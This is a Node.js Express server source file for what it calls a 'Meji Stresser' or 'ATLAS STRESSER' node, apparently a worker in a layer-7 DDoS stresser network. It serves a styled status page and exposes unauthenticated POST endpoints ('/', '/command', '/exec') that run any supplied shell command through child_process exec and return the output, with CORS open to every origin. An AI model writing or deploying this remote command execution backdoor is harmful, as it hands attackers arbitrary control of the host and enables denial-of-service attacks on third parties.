const express = require('express');
const { exec } = require('child_process');
const os = require('os');
// Dependencies

const app = express();
const PORT = process.env.PORT || 5050;

// Debug middleware - log semua request
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;

    console.log(`[${timestamp}] ${req.method} ${req.path} from ${clientIP}`);

    if (req.body && Object.keys(req.body).length > 0) {
        console.log(`  Body: ${JSON.stringify(req.body)}`);
    }

    if (req.headers['user-agent']) {
        console.log(`  User-Agent: ${req.headers['user-agent']}`);
    }

    next();
});

// Manual CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Registration Config
const NODE_NAME = process.env.NODE_NAME || `node-${os.hostname().split('.')[0]}-${Math.random().toString(36).slice(2, 5)}`;

app.get('/', (req, res) => {
    console.log('GET / - HTML Status Page accessed');
    const uptime = Math.floor(os.uptime());
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = uptime % 60;

    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${NODE_NAME} | Meji Node</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0a0b10;
            --card: rgba(20, 22, 30, 0.7);
            --accent: #ff3e3e;
            --accent-glow: rgba(255, 62, 62, 0.3);
            --text: #e0e6ed;
            --text-dim: #94a3b8;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background-color: var(--bg);
            color: var(--text);
            font-family: 'Outfit', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .bg-glow {
            position: absolute;
            width: 400px;
            height: 400px;
            background: var(--accent);
            filter: blur(150px);
            opacity: 0.1;
            z-index: 0;
            animation: pulse 8s infinite alternate;
        }
        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.05; }
            100% { transform: scale(1.5); opacity: 0.15; }
        }
        .card {
            position: relative;
            z-index: 1;
            width: 450px;
            padding: 40px;
            background: var(--card);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            text-align: center;
        }
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 16px;
            background: rgba(34, 197, 94, 0.1);
            border: 1px solid rgba(34, 197, 94, 0.2);
            color: #4ade80;
            border-radius: 100px;
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 24px;
        }
        .status-dot {
            width: 8px;
            height: 8px;
            background: #4ade80;
            border-radius: 50%;
            box-shadow: 0 0 10px #4ade80;
            animation: blink 2s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }
        h1 {
            font-size: 2rem;
            font-weight: 600;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #fff 0%, #94a3b8 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .node-id {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            color: var(--text-dim);
            margin-bottom: 32px;
        }
        .stats {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            margin-top: 24px;
        }
        .stat-item {
            padding: 16px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 16px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .stat-label {
            font-size: 0.75rem;
            color: var(--text-dim);
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-bottom: 4px;
        }
        .stat-value {
            font-size: 1.1rem;
            font-weight: 600;
            color: var(--text);
        }
        .footer {
            margin-top: 40px;
            font-size: 0.75rem;
            color: var(--text-dim);
        }
    </style>
</head>
<body>
    <div class="bg-glow"></div>
    <div class="card">
        <div class="status-badge">
            <div class="status-dot"></div>
            ACTIVE NODE
        </div>
        <h1>Meji Stresser</h1>
        <p class="node-id">${NODE_NAME}</p>
        
        <div class="stats">
            <div class="stat-item">
                <p class="stat-label">Platform</p>
                <p class="stat-value">${os.platform()} (${os.arch()})</p>
            </div>
            <div class="stat-item">
                <p class="stat-label">Uptime</p>
                <p class="stat-value">${hours}h ${minutes}m ${seconds}s</p>
            </div>
        </div>

        <div class="footer">
            Precision over Power • Silence over Noise
        </div>
    </div>
</body>
</html>
    `);
});

const commandHandler = (req, res) => {
    const { command } = req.body;
    const method = req.method;
    const path = req.path;

    console.log(`${method} ${path} - Command received: ${command || 'NO COMMAND'}`);

    if (!command) {
        console.log('  -> Missing command');
        return res.json({
            status: 'error',
            message: 'No command received'
        });
    }

    console.log(`  -> Executing: ${command}`);

    exec(command, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        const timestamp = new Date().toISOString();

        if (error) {
            console.error(`[${timestamp}] EXEC ERROR: ${error.message}`);
            return res.json({
                status: 'error',
                message: error.message
            });
        }

        const output = stdout || stderr || 'Command executed successfully (no output).';
        console.log(`[${timestamp}] EXEC SUCCESS (${output.length} bytes)`);
        res.json({
            status: 'success',
            output: output
        });
    });
};

app.post('/', commandHandler);
app.post('/command', commandHandler);
app.post('/exec', commandHandler);

app.get('/status', (req, res) => {
    console.log('GET /status - Status check accessed');
    res.json({
        status: 'online',
        server: os.hostname(),
        platform: os.platform(),
        uptime: os.uptime()
    });
});

app.listen(PORT, () => {
    process.stdout.write('\x1Bc');
    console.log(`
  ATLAS STRESSER  EXPRESS NODE
  ──────────────────────────────────────────────────
  Node Info:
  Status:    ONLINE
  Port:      ${String(PORT)}
  Node Name: ${NODE_NAME}
  OS:        ${os.platform()} (${os.arch()})
  Notice:    Manual registration required in l7.json
  ──────────────────────────────────────────────────
    `);

    console.log(`\n Ready to receive commands...\n`);
});

process.on('SIGINT', () => {
    console.log('\nShutting down gracefully...');
    process.exit(0);
});
